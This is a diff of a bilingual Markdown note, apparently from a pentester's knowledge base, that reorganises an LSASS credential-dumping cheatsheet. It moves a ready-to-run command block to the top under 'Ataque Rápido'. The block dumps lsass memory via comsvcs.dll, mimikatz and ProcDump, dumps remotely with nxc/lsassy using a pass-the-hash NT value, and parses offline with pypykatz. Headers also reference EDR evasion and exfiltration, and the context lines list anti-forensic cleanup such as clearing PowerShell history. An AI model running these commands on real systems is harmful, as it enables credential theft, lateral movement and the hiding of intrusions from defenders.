@@ -38,7 +38,34 @@ linked:
 
 ## Cheatsheet
 
-### 💉 Mimikatz Methods
+### 1. Ataque Rápido (TL;DR)
+
+```cmd
+:: Method 1: comsvcs.dll (stealth)
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
+
+:: Method 2: mimikatz on-host
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords > creds.txt
+
+:: Method 3: ProcDump
+procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+```
+
+```bash
+# Method 4: nxc remote dump (lateral)
+nxc smb <target> -u admin -H <NT> --local-auth -M lsassy
+
+# Offline parse
+pypykatz lsa minidump lsass.dmp
+```
+
+---
+
+### 2. Explotación
+
+#### 💉 Mimikatz Methods
 
 ````tabs
 tab: **Pre-Requirements**
@@ -72,7 +99,7 @@ tab: **Common Errors**
 ![[LSASS Dumping - Mimikatz Methods#^lsass-mimi-errors]]
 ````
 
-### 🔧 Native LOLBins
+#### 🔧 Native LOLBins
 
 ````tabs
 tab: **comsvcs.dll MiniDump**
@@ -100,7 +127,7 @@ tab: **Exfil Strategy**
 ![[LSASS Dumping - Native LOLBins#^lsass-lol-exfil]]
 ````
 
-### 🥷 Modern EDR Evasion
+#### 🥷 Modern EDR Evasion
 
 ````tabs
 tab: **nanodump**
@@ -131,7 +158,7 @@ tab: **Common Errors**
 ![[LSASS Dumping - Modern EDR Evasion#^lsass-evasion-errors]]
 ````
 
-### 🔬 Offline Parsing
+#### 🔬 Offline Parsing
 
 ````tabs
 tab: **pypykatz (Linux/Mac)**
@@ -156,7 +183,7 @@ tab: **Common Errors**
 ![[LSASS Dumping - Offline Parsing#^lsass-offline-errors]]
 ````
 
-### 🛡️ Detection & Mitigations
+#### 🛡️ Detection & Mitigations
 
 ````tabs
 tab: **Detection Events**
@@ -187,7 +214,7 @@ tab: **Common Errors (Defender)**
 ![[LSASS Dumping - Detection y Mitigations#^lsass-detect-errors]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **mimikatz**
@@ -285,31 +312,6 @@ tab: **Recursos**
    - Delete dump files
    - Clear PowerShell history
    - Mimikatz/procdump file removal
-```
-
----
-
-## Detección rápida
-
-```cmd
-:: Method 1: comsvcs.dll (stealth)
-tasklist /FI "IMAGENAME eq lsass.exe"
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
-
-:: Method 2: mimikatz on-host
-mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords > creds.txt
-
-:: Method 3: ProcDump
-procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
-```
-
-```bash
-# Method 4: nxc remote dump (lateral)
-nxc smb <target> -u admin -H <NT> --local-auth -M lsassy
-
-# Offline parse
-pypykatz lsa minidump lsass.dmp
 ```
 
 ---
